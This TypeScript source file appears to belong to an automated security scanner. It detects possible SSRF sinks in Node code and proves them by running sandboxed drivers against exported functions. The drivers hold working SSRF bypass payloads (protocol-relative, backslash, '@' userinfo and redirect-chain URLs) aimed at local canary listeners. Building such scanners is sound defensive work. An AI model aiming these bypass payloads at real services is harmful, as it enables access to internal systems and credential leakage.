import { readFileSync } from "node:fs";
import { dirname, join, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import type { Exploit } from "../types.js";
import type { Sandbox } from "../sandbox.js";
import { type Attacker, type StaticLead, nodeRunCommand, NODE_SOURCE_RE, freshMarker, nodeExportedNames } from "./attacker.js";

const HERE = dirname(fileURLToPath(import.meta.url));

// An SSRF sink: an outbound HTTP call whose URL is built from a variable (template, bare identifier,
// or concatenation) rather than a fixed literal. Covers global fetch, axios/got/undici, and node
// http(s). A lead, not a finding — whether the *host* is attacker-influenced is what the PoC decides.
const SINK_RE =
  /\b(?:fetch|axios(?:\.(?:get|post|put|delete|patch|head|request))?|got(?:\.(?:get|post|put|delete|patch|head))?|undici\.(?:fetch|request)|https?\.(?:get|request))\s*\(\s*(?:`[^`]*\$\{|[A-Za-z_$][\w$.]*(?:\([^)]*\))?(?:\s*\+[^,)]*)?\s*[,)]|['"][^'"]*['"]\s*(?:\+|[,)]))/;

// A lead whose URL begins with a FIXED `scheme://host[:port]/` literal — the host is hardcoded and
// the variable is in the PATH (there is a `/` between the authority and the first interpolation). The
// host can't be redirected except via the `@`/`//` userinfo trick (which the prove phase still tests),
// so it ranks `low`. Everything else (a bare URL variable, `${x}` at the start, or a fixed host with
// NO trailing slash before the variable — subdomain/userinfo-injectable) ranks `high` (issue #12).
const AUTHORITY_FIXED_RE =
  /(?:fetch|axios(?:\.[a-z]+)?|got(?:\.[a-z]+)?|undici\.[a-z]+|https?\.[a-z]+)\s*\(\s*[`'"]https?:\/\/[a-zA-Z0-9.\-]+(?::\d+)?\//i;

// #13 provenance refinement: a host-variable lead is down-ranked to `low` when the variable that
// controls the host is CONFIG — assigned from `process.env` / an env helper / a literal URL — rather
// than flowing in as an untrusted parameter. This is the piece that separates `fetch(`${baseUrl}/x`)`
// (config) from `fetch(url)` where `url` is an entrypoint parameter (untrusted). Conservative: only
// DOWN-ranks on a confident config signal; anything unresolved stays `high` (worth reach-the-sink).
const CONFIG_RHS_RE = /process\.env|requiredEnv|getenv|['"`]https?:\/\//i;

/** The identifier that controls the request host in a fetch line (or "process.env" for a direct env
 *  read), else null. Covers a bare URL var, a `${var}`-led template, and a `"http://" + var` concat. */
function hostVar(line: string): string | null {
  const call = "(?:fetch|axios[.a-z]*|got[.a-z]*|undici\\.[a-z]+|https?\\.[a-z]+)";
  if (new RegExp(`\\b${call}\\s*\\(\\s*[\`'"]?\\s*(?:\\$\\{\\s*)?process\\.env\\b`).test(line)) return "process.env";
  let m = line.match(new RegExp(`\\b${call}\\s*\\(\\s*([A-Za-z_$][\\w$.]*)\\s*[,)]`));
  if (m) return m[1];
  m = line.match(new RegExp("\\b" + call + "\\s*\\(\\s*`\\$\\{\\s*([A-Za-z_$][\\w$.]*)"));
  if (m) return m[1];
  m = line.match(/['"]https?:\/\/['"]\s*\+\s*([A-Za-z_$][\w$.]*)/);
  if (m) return m[1];
  return null;
}

/** True if `v`'s definition in `source` is config (env / literal URL). Only a confident match. */
function isConfigVar(v: string, source: string): boolean {
  if (v === "process.env" || v.startsWith("process.env.")) return true;
  const base = v.split(".")[0].replace(/[^\w$]/g, "");
  if (!base) return false;
  const m = source.match(new RegExp(`\\b(?:const|let|var)\\s+${base}\\s*=\\s*([^;\\n]+)`));
  return m ? CONFIG_RHS_RE.test(m[1]) : false;
}

function firstSinkLine(source: string): number {
  const lines = source.split("\n");
  for (let i = 0; i < lines.length; i++) if (SINK_RE.test(lines[i])) return i + 1;
  return 1;
}

function ssrfBoundaryDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const fn = JSON.stringify(fnName);
  const mk = JSON.stringify(marker);
  const markerPayload = encodeURIComponent(marker);
  return `
import http from "node:http";
import { URL } from "node:url";
const MARKER = ${mk};
const MARKER_ENCODED = "${markerPayload}";

let m;
try {
  m = await import(${mod});
} catch (e) {
  process.stdout.write("IMPORT_FAIL:" + e);
  process.exit(0);
}

const fn = (m && m[${fn}]) || (m && m.default && (m.default[${fn}] || m.default));
if (typeof fn !== "function") {
  process.stdout.write("NOT_A_FUNCTION");
  process.exit(0);
}

function asHeader(v) {
  if (v == null) return "";
  if (Array.isArray(v)) return String(v[0] || "");
  if (typeof v === "string") return v;
  try {
    return String(v);
  } catch {
    return "";
  }
}

let allowHits = 0;
let boundaryHits = 0;
let boundaryReq = null;
let boundaryHeader = null;
let allowHeader = null;
let triggeredPayload = null;
let currentPayload = null;
let currentReason = null;

const allowServer = http.createServer((req, res) => {
  const line = (req.url || "") + " host=" + (req.headers.host || "");
  if (line.includes(MARKER)) allowHits += 1;
  if (line.indexOf("/api/redirect") !== -1) {
    const reqUrl = new URL(req.url, "http://127.0.0.1");
    const to = reqUrl.searchParams.get("to");
    if (to) {
      res.statusCode = 302;
      res.setHeader("location", decodeURIComponent(to));
      res.end("redirect");
      return;
    }
  }
  if (line.includes(MARKER)) {
    res.statusCode = 200;
    if (!seenBaseline) {
      allowHeader = asHeader(req.headers["x-raeuber-secret"]);
    }
  } else {
    res.statusCode = 404;
  }
  res.end("ALLOW_" + MARKER);
});
const boundaryServer = http.createServer((req, res) => {
  const line = (req.url || "") + " host=" + (req.headers.host || "");
  if (line.includes(MARKER)) {
    boundaryHits += 1;
    boundaryReq = line;
    boundaryHeader = asHeader(req.headers["x-raeuber-secret"]);
  }
  res.statusCode = 200;
  res.end("BOUNDARY_" + MARKER);
});

await new Promise((resolve) => allowServer.listen(0, "127.0.0.1", resolve));
await new Promise((resolve) => boundaryServer.listen(0, "127.0.0.1", resolve));
const allowPort = allowServer.address().port;
const boundaryPort = boundaryServer.address().port;

const allowOrigin = "http://127.0.0.1:" + allowPort;
const boundaryOrigin = "http://127.0.0.1:" + boundaryPort;

async function callAndWait(payload) {
  currentPayload = payload;
  try {
    await fn(payload);
  } catch {
    // Sink attempts can throw after the request lands; callback evidence still validates SSRF.
  }
  await new Promise((resolve) => setTimeout(resolve, 120));
}

const payloads = [
  { kind: "allow", url: allowOrigin + "/api/allow?token=" + MARKER_ENCODED },
  { kind: "protocol-relative", url: "//127.0.0.1:" + boundaryPort + "/api/protocol?token=" + MARKER_ENCODED },
  { kind: "backslash-normalized", url: "https:\\\\127.0.0.1:" + boundaryPort + "/api/backslash?token=" + MARKER_ENCODED },
  { kind: "alternate-authority", url: "http://trusted@127.0.0.1:" + boundaryPort + "/api/userinfo?token=" + MARKER_ENCODED },
  {
    kind: "redirect-chain",
    url:
      allowOrigin +
      "/api/redirect?token=" +
      MARKER_ENCODED +
      "&to=" +
      encodeURIComponent(boundaryOrigin + "/api/redirect-callback?token=" + MARKER_ENCODED),
  },
];

let seenBaseline = false;
for (const payload of payloads) {
  await callAndWait(payload.url);
  if (payload.kind === "allow") {
    if (allowHits > 0) {
      seenBaseline = true;
    }
    continue;
  }
  if (seenBaseline && boundaryReq && boundaryReq.includes(MARKER)) {
    triggeredPayload = currentPayload;
    currentReason = payload.kind;
    break;
  }
}

allowServer.close();
boundaryServer.close();

if (boundaryHits > 0 && seenBaseline && boundaryReq && boundaryReq.includes(MARKER)) {
  const evidencePayload = triggeredPayload || payloads[1].url;
  process.stdout.write(
    "BOUNDARY_BYPASS payload=" +
      evidencePayload +
      " variant=" +
      (currentReason || "unknown") +
      " callback=" +
      boundaryReq +
      " allowHeader=" +
      (allowHeader || "") +
      " boundaryHeader=" +
      (boundaryHeader || "")
  );
} else if (seenBaseline) {
  process.stdout.write("BOUNDARY_SAFE");
  if (!allowHeader) {
    process.stdout.write(" ALLOW_NO_SECRET");
  }
} else {
  process.stdout.write("BOUNDARY_UNKNOWN");
}
`.trim();
}

/**
 * A self-contained CommonJS driver that PROVES SSRF with an out-of-band signal and zero external
 * network: it starts a throwaway HTTP listener on 127.0.0.1:<ephemeral>, then calls the target's
 * exported `fnName` with a series of payloads pointing at that listener — a full loopback URL (a sink
 * that fetches the raw argument), a `@`-userinfo host (a sink that appends the argument to a fixed
 * host prefix — `https://api.example.com` + `@127.0.0.1:P/…` resolves to the listener), and a
 * scheme-relative form. If the app makes the request, the listener sees the per-run marker in the
 * path → `oob-request` fired. The marker cannot arrive by coincidence, and nothing leaves the box.
 */
function ssrfCanaryDriver(moduleRel: string, fnName: string, marker: string): string {
  const mod = JSON.stringify("./" + moduleRel);
  const fn = JSON.stringify(fnName);
  const mk = JSON.stringify(marker);
  // ESM driver (top-level await), run under `node --experimental-transform-types` so `import()`
  // reaches .ts / .mjs / .cjs / .js entrypoints alike.
  return `
import http from "node:http";
const MARKER = ${mk};
let firedPayload = null, currentPayload = null, hitLine = null;
const server = http.createServer((req, res) => {
  const line = (req.url || "") + " host=" + (req.headers.host || "");
  if (line.indexOf(MARKER) !== -1) { firedPayload = currentPayload; hitLine = line; }
  res.statusCode = 200; res.end("ok");
});
server.on("error", () => {});
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const port = server.address().port;
let m;
try { m = await import(${mod}); } catch (e) { process.stdout.write("IMPORT_FAIL:" + e); server.close(); process.exit(0); }
const fn = (m && m[${fn}]) || (m && m.default && (m.default[${fn}] || m.default));
if (typeof fn !== "function") { process.stdout.write("NOT_A_FUNCTION"); server.close(); process.exit(0); }
const payloads = [
  "http://127.0.0.1:" + port + "/" + MARKER,   // sink fetches the raw argument
  "@127.0.0.1:" + port + "/" + MARKER,          // sink appends arg to a fixed host prefix (userinfo bypass)
  "//127.0.0.1:" + port + "/" + MARKER,         // scheme-relative append
];
for (const pl of payloads) {
  if (firedPayload) break;
  currentPayload = pl;
  try { await fn(pl); } catch (e) { /* the request may throw after the connection lands; the OOB hit still counts */ }
  await new Promise((r) => setTimeout(r, 150));
}
process.stdout.write(firedPayload ? ("OOB_FIRED payload=" + firedPayload + " req=" + hitLine) : "no-oob");
server.close();
`.trim();
}

export class SsrfAttacker implements Attacker {
  readonly attackClass = "ssrf" as const;
  readonly canaryFixtureDir = resolve(HERE, "..", "..", "fixtures", "ssrf-node");

  handles(file: string): boolean {
    return NODE_SOURCE_RE.test(file);
  }

  staticLeads(source: string): StaticLead[] {
    const leads: StaticLead[] = [];
    const lines = source.split("\n");
    for (let i = 0; i < lines.length; i++) {
      const m = lines[i].match(SINK_RE);
      if (!m) continue;
      let priority: "high" | "low" = AUTHORITY_FIXED_RE.test(lines[i]) ? "low" : "high"; // #12 host-vs-path
      if (priority === "high") {
        const v = hostVar(lines[i]);
        if (v && isConfigVar(v, source)) priority = "low"; // #13 config provenance → down-rank
      }
      leads.push({ line: i + 1, sink: m[0].split("(")[0].trim(), priority });
    }
    return leads;
  }

  hunt(targetDir: string, files: string[], sandbox: Sandbox): Exploit[] {
    const exploits: Exploit[] = [];
    for (const file of files) {
      if (!this.handles(file)) continue;
      let source: string;
      try {
        source = readFileSync(join(targetDir, file), "utf8");
      } catch {
        continue;
      }
      if (!SINK_RE.test(source)) continue; // no outbound-request lead
      const names = nodeExportedNames(source);
      if (names.length === 0) continue; // reachable sink but no exported entrypoint to drive
      const sinkLine = firstSinkLine(source);
      const sink = (source.match(SINK_RE)?.[0] ?? "fetch").split("(")[0].trim();

      let fired = false;
      for (const name of names) {
        if (fired) break;
        const marker = freshMarker();
        const driverRel = `.raeuber-driver-${marker}.mjs`;
        const boundaryRel = `.raeuber-boundary-${marker}.mjs`;
        sandbox.writeFile(boundaryRel, ssrfBoundaryDriver(file, name, marker));
        const boundaryRun = sandbox.exec(`${nodeRunCommand(targetDir)} ${boundaryRel} 2>&1`, 25_000);
        const boundaryOut = boundaryRun.stdout + boundaryRun.stderr;
        if (boundaryOut.includes("BOUNDARY_BYPASS") && boundaryOut.includes("payload=")) {
          const payload = boundaryOut.match(/payload=(\S+)/)?.[1] ?? `http://127.0.0.1/${marker}`;
          const callback = boundaryOut.match(/callback=(\S+)/)?.[1] ?? "";
          const boundaryHeader = boundaryOut.match(/boundaryHeader=(\S+)/)?.[1] ?? "";
          const allowHeader = boundaryOut.match(/allowHeader=(\S+)/)?.[1] ?? "";
          exploits.push({
            attackClass: "ssrf",
            proof: "oob-request",
            file,
            line: sinkLine,
            sink: `ssrf-boundary(${name})`,
            summary:
              `Exported function \`${name}()\` passes trust-boundary inputs through the same parsing/normalization path, ` +
              `and a credential-bearing request reaches a different local origin after validation (protocol-relative/backslash/redirect boundary differential).`,
            payload,
            evidence:
              `URL trust-boundary differential triggered (variant=${boundaryOut.match(/variant=(\S+)/)?.[1] || "unknown"}, ` +
              `callback=${callback}, allowHeader=${allowHeader}, boundaryHeader=${boundaryHeader}). ` +
              boundaryOut.slice(0, 800),
          });
          fired = true;
          continue;
        }

        sandbox.writeFile(driverRel, ssrfCanaryDriver(file, name, marker));
        const run = sandbox.exec(`${nodeRunCommand(targetDir)} ${driverRel} 2>&1`, 20_000);
        const out = run.stdout + run.stderr;
        if (out.includes("OOB_FIRED") && out.includes(marker)) {
          const payload = out.match(/OOB_FIRED payload=(\S+)/)?.[1] ?? `http://127.0.0.1/${marker}`;
          exploits.push({
            attackClass: "ssrf",
            proof: "oob-request",
            file,
            line: sinkLine,
            sink,
            summary: `Untrusted first argument of exported \`${name}()\` reaches an outbound request with no host allowlist; a loopback-canary URL was fetched (SSRF).`,
            payload,
            evidence:
              `driver started a 127.0.0.1 canary; ${name}(${JSON.stringify(payload)}) made an ` +
              `out-of-band request carrying marker ${marker}:\n` +
              out.slice(0, 800),
          });
          fired = true;
        }
      }
    }
    return exploits;
  }
}
